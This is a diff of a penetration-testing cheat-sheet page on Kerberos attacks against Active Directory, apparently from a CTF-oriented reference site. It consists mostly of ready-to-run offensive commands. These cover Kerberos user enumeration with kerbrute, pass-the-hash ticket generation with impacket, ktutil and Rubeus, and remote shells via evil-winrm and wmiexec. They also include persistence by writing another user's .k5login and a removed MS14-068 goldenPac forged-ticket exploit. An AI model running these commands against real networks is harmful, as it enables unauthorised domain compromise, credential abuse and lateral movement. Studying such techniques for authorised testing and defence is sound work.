@@ -188,6 +188,8 @@
   
   <li><a href="https://tldrbins.github.io/@kerbrute/">Kerbrute</a></li>
   
+  <li><a href="https://tldrbins.github.io/@rubeus/">Rubeus</a></li>
+  
   <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
   
   <li><a href="https://tldrbins.github.io/@ad/">Ad</a></li>
@@ -198,35 +200,47 @@
   
   <li><a href="https://tldrbins.github.io/@smb/">Smb</a></li>
   
-  <li><a href="https://tldrbins.github.io/@ms14-068/">MS14-068</a></li>
-  
-  <li><a href="https://tldrbins.github.io/@golden-ticket/">Golden Ticket</a></li>
-  
-  <li><a href="https://tldrbins.github.io/@goldpac/">Goldpac</a></li>
-  
 </ul>
 
 <div class="content"><hr>
-<h3 id="kerbrute">Kerbrute</h3>
-<p><a href="https://github.com/ropnop/kerbrute">kerbrute</a></p>
+<h3 id="users-enum">Users enum</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">kerbrute</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerbrute userenum --domain &lt;DOMAIN&gt; --dc &lt;DC&gt; usernames.txt
-</span></span></code></pre></div><h4 id="usernames-generator">Usernames generator</h4>
-<p><a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a></p>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/ropnop/kerbrute">kerbrute</a></em></small></p></div></p>
+<h3 id="usernames-generator">Usernames generator</h3>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">username-anarchy</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./username-anarchy -i users.txt <span class="p">|</span> tee usernames.txt
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a></em></small></p></div></p>
+<br>
 <hr>
-<h3 id="generate-kerberos-ticket-from-linux">Generate Kerberos Ticket (From Linux)</h3>
-<h4 id="method-1-using-impacket">Method #1: Using impacket</h4>
+<h3 id="generate-kerberos-ticket-from-linux">Generate Kerberos ticket (From Linux)</h3>
+<p>
+<button data-tabset="set3" data-tabcontent="tab1" class="active">Impacket</button>
+
+<button data-tabset="set3" data-tabcontent="tab2" >Kinit</button>
+
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-getTGT -hashes :&lt;HASH&gt; &lt;DOMAIN&gt;/administrator
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check ticket</span>
 </span></span><span class="line"><span class="cl">klist
-</span></span></code></pre></div><h4 id="method-2--using-kinit">Method #2 : Using kinit</h4>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 0: Installation</span>
 </span></span><span class="line"><span class="cl">sudo apt install krb5-user cifs-utils
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 1: Add domain controller to &#39;/etc/hosts&#39; (Try different order if not work)</span>
 </span></span><span class="line"><span class="cl">10.10.11.10 &lt;DC&gt; &lt;DOMAIN&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 2: Add domain controller as a DNS server to &#39;/etc/resolv.conf&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 2: Add domain controller as a DNS server to &#39;/etc/resolv.conf&#39; [optional]</span>
 </span></span><span class="line"><span class="cl">nameserver 10.10.11.10
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 3: Edit &#39;/etc/krb5.conf&#39;</span>
 </span></span><span class="line"><span class="cl">
@@ -245,41 +259,80 @@
 </span></span><span class="line"><span class="cl">    domain.internal <span class="o">=</span> &lt;DOMAIN&gt;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 4: Sync time to domain controller</span>
 </span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt;
-</span></span></code></pre></div><h4 id="2a-without-creds">2a. Without Creds</h4>
+</span></span></code></pre></div></div>
+<h4 id="2a-without-creds">2a. Without creds</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Generate kerberos ticket for user</span>
 </span></span><span class="line"><span class="cl">kinit &lt;USER&gt;
-</span></span></code></pre></div><h4 id="2b-with-hash">2b. With Hash</h4>
+</span></span></code></pre></div></div>
+<h4 id="2b-with-ntlm-hash">2b. With NTLM hash</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ktutil
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">add_entry -p administrator@&lt;DOMAIN&gt; -k <span class="m">1</span> -key -e rc4-hmac
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;HASH&gt;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">write_kt administrator.keytab
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exit</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kinit -V -k -t administrator.keytab -f administrator@&lt;DOMAIN&gt;
-</span></span></code></pre></div><h4 id="3-check-ticket">3. Check ticket</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-check-ticket">3. Check ticket</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">klist
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+</div></p>
+<h3 id="generate-kerberos-ticket-from-windows">Generate Kerberos ticket (From Windows)</h3>
+<p>
+<button data-tabset="set4" data-tabcontent="tab1" class="active">rubeus</button>
+
+<div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="p">&lt;</span><span class="n">USER</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">enctype</span><span class="err">:</span><span class="n">AES256</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DC</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">nowrap</span>
+</span></span></code></pre></div></div>
+</div></p>
+<br>
 <hr>
-<h3 id="remote-to-target-with-kerberos">Remote to target with kerberos</h3>
-<h4 id="method-1--using-evil-winrm">Method #1 : Using evil-winrm</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> evil-winrm -i &lt;TARGET_DOMAIN&gt; -r &lt;DOMAIN&gt;
-</span></span></code></pre></div><h4 id="method-2--using-wmiexec">Method #2 : Using wmiexec</h4>
+<h3 id="winrm-with-kerberos">Winrm with Kerberos</h3>
+<p>
+<button data-tabset="set5" data-tabcontent="tab1" class="active">evil-winrm</button>
+
+<button data-tabset="set5" data-tabcontent="tab2" >wmiexec</button>
+
+<div class="tabcontent" data-tabset="set5" data-tabcontent="tab1"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 1: Edit &#39;/etc/krb5.conf&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>libdefaults<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">default_realm</span> <span class="o">=</span> &lt;DOMAIN&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>realms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    &lt;DOMAIN&gt; <span class="o">=</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">kdc</span> <span class="o">=</span> &lt;DC&gt;:88
+</span></span><span class="line"><span class="cl">        <span class="nv">admin_server</span> <span class="o">=</span> &lt;DC&gt;
+</span></span><span class="line"><span class="cl">        <span class="nv">default_domain</span> <span class="o">=</span> &lt;DOMAIN&gt;
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="o">[</span>domain_realm<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    .domain.internal <span class="o">=</span> &lt;DOMAIN&gt;
+</span></span><span class="line"><span class="cl">    domain.internal <span class="o">=</span> &lt;DOMAIN&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 2: Connect</span>
+</span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> evil-winrm -i &lt;TARGET_DOMAIN&gt; -r &lt;DOMAIN&gt;
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set5" data-tabcontent="tab2"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-wmiexec &lt;DOMAIN&gt;/administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+</div></p>
+<br>
 <hr>
-<h3 id="connect-to-smb-with-kerberos">Connect to SMB with kerberos</h3>
+<h3 id="connect-to-smb-with-kerberos">Connect to SMB with Kerberos</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-smbclient &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET_DOMAIN&gt; -k -no-pass
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
 <hr>
-<h3 id="add-kerboros-access-linux">Add Kerboros Access (Linux)</h3>
+<h3 id="add-kerberos-access-in-linux">Add Kerberos Access in Linux</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&lt;USER&gt;@&lt;DOMAIN&gt;&#34;</span> &gt; /home/&lt;TARGET_USER&gt;/.k5login
-</span></span></code></pre></div><br>
-<hr>
-<h3 id="ms14-068-forged-golden-ticket">MS14-068 (Forged Golden Ticket)</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># With creds</span>
-</span></span><span class="line"><span class="cl">impacket-goldenPac <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET_DOMAIN&gt;&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># With hash</span>
-</span></span><span class="line"><span class="cl">impacket-goldenPac --hashes :hash <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET_DOMAIN&gt;&#39;</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
